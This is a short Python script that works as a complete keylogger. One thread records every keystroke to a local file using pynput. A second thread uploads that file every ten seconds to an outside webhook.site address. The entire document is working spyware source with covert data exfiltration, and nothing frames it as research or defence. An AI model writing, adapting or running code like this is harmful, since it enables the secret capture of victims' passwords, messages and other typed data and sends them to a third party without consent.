from pynput.keyboard import Listener as bone
import logging
import threading
import time
import requests

def tandav():

    # logging.basicConfig(filename=("data.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
    logging.basicConfig(filename=("data.txt"), level=logging.INFO, format="%(message)s")

    def on_press(key):
        logging.info(str(key))

    with bone(on_press=on_press) as bruno:
        bruno.join()


def astra():
    while True:
        time.sleep(10)
        try:
            webhook_url = "https://webhook.site/e5bbc3b7-10a9-4653-bc6f-3b46f27d74c0"
            with open("data.txt", 'r') as file:
                content = file.read()

            payload = {
                "data": content
            }

            response = requests.post(webhook_url, files=payload)

            if response.status_code == 200:
                print("File sent successfully.")
            else:
                print(f"Failed to send file. Status code: {response.status_code}")
        except Exception as e:
            print(f"An error occurred: {e}")
    
        
if __name__ == "__main__":
    print("starting threads")
    t1 = threading.Thread(target=tandav)
    t1.start()
    t2 = threading.Thread(target=astra)
    t2.start()
    print("threads started...")

 